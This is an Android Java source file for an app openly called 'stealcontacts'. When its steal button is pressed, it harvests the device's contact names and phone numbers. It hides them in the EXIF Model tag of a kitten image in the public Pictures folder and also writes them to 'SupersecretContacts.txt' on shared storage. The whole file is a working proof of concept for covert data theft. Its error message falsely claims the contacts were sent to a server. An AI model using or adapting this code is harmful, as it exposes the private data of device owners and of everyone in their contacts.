/*
Copyright 2010 Kieran Levin


    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

package com.kieranlevin.stealcontacts;

import java.io.*;

import android.app.Activity;
import android.media.MediaScannerConnection;
import android.os.Bundle;
import android.os.Environment;
import android.widget.Button;
import android.util.Log;
import android.view.View.OnClickListener;
import android.content.ContentResolver;
import android.content.Context;
import android.view.View;
import android.app.ProgressDialog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.database.Cursor;
import android.media.ExifInterface;
import android.widget.Toast;

public class stealcontactsmain extends Activity {

	
	/** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        // Capture our button from layout
        Button stealdata = (Button)findViewById(R.id.steal);
        // Register the onClick listener with the implementation above
        stealdata.setOnClickListener(mAddsteal);
        
        // Capture our button from layout
        Button exit = (Button)findViewById(R.id.exit);
        // Register the onClick listener with the implementation above
        exit.setOnClickListener(mAddexit);
        
    }
    
 // Create an anonymous implementation of OnClickListener
    private OnClickListener mAddsteal = new OnClickListener()
    {
    	public void onClick(View v)
    	{

    		// do something when the button is clicked
    		try
    		{
    			ProgressDialog dialog = ProgressDialog.show(stealcontactsmain.this, "", 
                        "Stealing. Please wait...", true);
    	        //String[] columns = new String[] {ContactsContract.Contacts.DISPLAY_NAME};
    			createExternalStoragePublicPicture();
    			

    			
    			getColumnData();
    			dialog.setProgress(1000);
    			dialog.dismiss();
    		}
    		catch (Exception ex)
    		{
      		   ex.printStackTrace();

    		}
    	}
    };
    private OnClickListener mAddexit = new OnClickListener()
    {
    	public void onClick(View v)
    	{
    		// exit when the button is clicked
    		try
    		{
    			finish();
    		}
    		catch (Exception ex)
    		{

    		}
    	}
    };

    private boolean Checkstorage()
    {
    	boolean mExternalStorageAvailable = false;
    	boolean mExternalStorageWriteable = false;
    	String state = Environment.getExternalStorageState();

    	if (Environment.MEDIA_MOUNTED.equals(state)) {
    	    // We can read and write the media
    	    mExternalStorageAvailable = mExternalStorageWriteable = true;
    	} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
    	    // We can only read the media
    	    mExternalStorageAvailable = true;
    	    mExternalStorageWriteable = false;
    	} else {
    	    // Something else is wrong. It may be one of many other states, but all we need
    	    //  to know is we can neither read nor write
    	    mExternalStorageAvailable = mExternalStorageWriteable = false;
    	}
    	
    	
    	if (mExternalStorageWriteable == true) return true; 
    	else return false; 
    	
    	
    }

    void createExternalStoragePublicPicture() {
        // Create a path where we will place our picture in the user's
        // public pictures directory.  Note that you should be careful about
        // what you place here, since the user often manages these files.  For
        // pictures and other media owned by the application, consider
        // Context.getExternalMediaDir().
        File path = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        File file = new File(path, "DemoPicture.jpg");

        try {
            // Make sure the Pictures directory exists.
            path.mkdirs();

            // Very simple code to copy a picture from the application's
            // resource into the external file.  Note that this code does
            // no error checking, and assumes the picture is small (does not
            // try to copy it in chunks).  Note that if external storage is
            // not currently mounted this will silently fail.
            InputStream is = getResources().openRawResource(R.drawable.kitten);
            OutputStream os = new FileOutputStream(file);
            byte[] data = new byte[is.available()];
            is.read(data);
            os.write(data);
            is.close();
            os.close();

        } catch (IOException e) {
            // Unable to create file, likely because external storage is
            // not currently mounted.
            Log.w("ExternalStorage", "Error writing " + file, e);
        }
    }

    void deleteExternalStoragePublicPicture() {
        // Create a path where we will place our picture in the user's
        // public pictures directory and delete the file.  If external
        // storage is not currently mounted this will fail.
        File path = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        File file = new File(path, "DemoPicture.jpg");
        file.delete();
    }

    boolean hasExternalStoragePublicPicture() {
        // Create a path where we will place our picture in the user's
        // public pictures directory and check if the file exists.  If
        // external storage is not currently mounted this will think the
        // picture doesn't exist.
        File path = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        File file = new File(path, "DemoPicture.jpg");
        return file.exists();
    }
    
    private void getColumnData(){ 
	//Pulls column data and writes it to a string
	//parses out contacts with phone numbers only
    	try { 
    		String contactdata = "";
            File path = Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES);
            
    		ExifInterface exif = new ExifInterface(path.getPath() +  "/DemoPicture.jpg");

    		ContentResolver cr = getContentResolver();
    		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
    				null, null, null, null);
    		if (cur.getCount() > 0) {
    			while (cur.moveToNext()) {
    				String id = cur.getString(
    						cur.getColumnIndex(ContactsContract.Contacts._ID));
    				String name = cur.getString(
    						cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
    				
    				if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
    					contactdata += name + ",";
    					//Query phone here.  Covered next
    					if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
    						Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
    								new String[]{id}, null);
    						while (pCur.moveToNext()) {
    							// Do something with phones
    							String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
    							contactdata += phoneNumber + ",";
    						} 
    						//add delimiter
    						contactdata += ";";
    						pCur.close();
    					}

    				}
    			}
    		}
    		//writes an appended version to the picture
    		exif.setAttribute(ExifInterface.TAG_MODEL, contactdata.substring(1, 250));
    		exif.saveAttributes();
    		// write to a file as well for kicks
    		FileOutputStream f = new FileOutputStream(new File(path.getPath(), "SupersecretContacts.txt"));
    		f.write(contactdata.getBytes());
    		f.close();
    		Context context = getApplicationContext();
    		CharSequence text = "Success - Wrote out contacts ";
    		int duration = Toast.LENGTH_LONG;
    		Toast toast = Toast.makeText(context, text, duration);
    		toast.show();

    	} catch (IOException e) {
    		// TODO Auto-generated catch block
    		e.printStackTrace();
    		Context context = getApplicationContext();
    		CharSequence text = e.toString() + "Success - Sent contacts to server ";
    		int duration = Toast.LENGTH_LONG;
    		Toast toast = Toast.makeText(context, text, duration);
    		toast.show();
    	}


    }
}
